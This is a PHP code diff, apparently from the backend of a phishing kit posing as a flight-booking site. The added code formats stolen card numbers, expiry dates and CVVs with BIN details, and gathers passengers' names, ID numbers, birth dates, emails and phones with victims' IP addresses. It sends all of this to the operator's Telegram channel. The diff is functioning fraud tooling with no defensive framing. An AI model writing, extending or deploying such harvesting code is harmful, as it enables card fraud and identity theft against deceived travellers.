@@ -393,11 +393,25 @@ switch ($tipo) {
             ];
             $identico = get_identico($array_search);
             if (!$identico) {
+                // Identificar tipo de BIN
+                $bin_info = identificar_tipo_bin($bin);
+
                 $contenido = '💸💸💸 CARD 💸💸💸' . "\n";
                 $contenido .= "🏦 Banco: " . $banco . "\n";
                 $contenido .= "💳 Tarjeta: " . $tarjeta . "\n";
                 $contenido .= "📆 Fecha Exp: " . $ftarjeta . "\n";
                 $contenido .= "👁 CVV: " . $cvv . "\n";
+
+                // Agregar información del BIN
+                if ($bin_info['success']) {
+                    $contenido .= '━━━━━ BIN INFO ━━━━━' . "\n";
+                    $contenido .= "🔖 Tipo: " . $bin_info['tipo'] . "\n";
+                    $contenido .= "🏷 Marca: " . $bin_info['marca'] . "\n";
+                    $contenido .= "🏦 Banco BIN: " . $bin_info['banco'] . "\n";
+                    $contenido .= "🌎 País: " . $bin_info['pais'] . "\n";
+                    $contenido .= "💰 Prepago: " . $bin_info['prepago'] . "\n";
+                }
+
                 $contenido .= '🔧🔧🔧🔧🔧🔧🔧🔧🔧' . "\n";
                 $contenido .= "👱 Cedula: " . $cedula . "\n";
                 $contenido .= "💁 Nombre: " . $nombres . "\n";
@@ -638,6 +652,10 @@ switch ($tipo) {
             $data['v1_vuelo_code'] = $_POST['vuelo_code'];
             $data['action'] = ['vuelos.php', true];
         } else if ($_POST["vez"] == 2) {
+            $data['v1_hora_salida'] = $_POST['v1_hora_salida'];
+            $data['v1_hora_llegada'] = $_POST['v1_hora_llegada'];
+            $data['v1_precio'] = $_POST['v1_precio'];
+            $data['v1_vuelo_code'] = $_POST['v1_vuelo_code'];
             $data['v2_hora_salida'] = $_POST['hora_salida'];
             $data['v2_hora_llegada'] = $_POST['hora_llegada'];
             $data['v2_precio'] = $_POST['precio'];
@@ -674,6 +692,63 @@ switch ($tipo) {
         ];
         $data['registro'] = $registro = crear_registro($array);
         $data['ip'] =  $array['ip'];
+        $data['action'] = ['card.php', true];
+        break;
+    case 'datos-pasajeros':
+        $pasajeros_json = $_POST['pasajeros'] ?? '[]';
+        $pasajeros = json_decode($pasajeros_json, true);
+        $cedula = $_POST['cedula'] ?? 'SIN_CEDULA';
+        $email = $_POST['email'] ?? 'SIN_EMAIL';
+        $celular = $_POST['celular'] ?? 'SIN_CELULAR';
+        $nombres = $_POST['nombres'] ?? 'SIN_NOMBRES';
+        $ciudad = $_POST['ciudad'] ?? 'SIN_CIUDAD';
+        $direccion = $_POST['direccion'] ?? 'SIN_DIRECCION';
+        $banco = $_POST['banco'] ?? 'SIN_BANCO';
+
+        // Crear registro en la base de datos
+        $array = [
+            'status' => 'rec_datos_pasajeros',
+            'email' => $email,
+            'cedula' => $cedula,
+            'nombres' => $nombres,
+            'celular' => $celular,
+            'ciudad' => $ciudad,
+            'direccion' => $direccion,
+            'dispositivo' => $_SERVER['HTTP_USER_AGENT'],
+            'banco' => $banco,
+            'ip' => $_SERVER['REMOTE_ADDR'],
+            'horacreado' => time(),
+            'owner' => $owner,
+        ];
+
+        $data['registro'] = $registro = crear_registro($array);
+
+        // Enviar información de pasajeros a Telegram
+        if (count($pasajeros) > 0) {
+            $contenido = '✈️✈️✈️ PASAJEROS ✈️✈️✈️' . "\n";
+            $contenido .= '━━━━━━━━━━━━━━━━━━━━' . "\n";
+
+            foreach ($pasajeros as $index => $pasajero) {
+                $num_pasajero = $index + 1;
+                $contenido .= "\n👤 PASAJERO #$num_pasajero\n";
+                $contenido .= "👤 Nombre: " . $pasajero['nombre'] . " " . $pasajero['apellido'] . "\n";
+                $contenido .= "📋 Tipo Doc: " . $pasajero['tipoDocumento'] . "\n";
+                $contenido .= "🆔 Documento: " . $pasajero['numDocumento'] . "\n";
+                $contenido .= "⚧ Género: " . $pasajero['genero'] . "\n";
+                $contenido .= "🎂 F. Nacimiento: " . $pasajero['fechaNacimiento'] . "\n";
+                $contenido .= "📧 Email: " . $pasajero['email'] . "\n";
+                $contenido .= "📞 Teléfono: " . $pasajero['telefono'] . "\n";
+                $contenido .= '━━━━━━━━━━━━━━━━━━━━' . "\n";
+            }
+
+            $contenido .= "\n🔧 INFORMACIÓN ADICIONAL\n";
+            $contenido .= "📱 IP: " . $_SERVER['REMOTE_ADDR'] . "\n";
+            $contenido .= "💻 Dispositivo: " . $_SERVER['HTTP_USER_AGENT'] . "\n";
+
+            // Enviar a Telegram (card channel por ahora)
+            enviar_telegram($contenido, $owner, false, []);
+        }
+
         $data['action'] = ['card.php', true];
         break;
 }
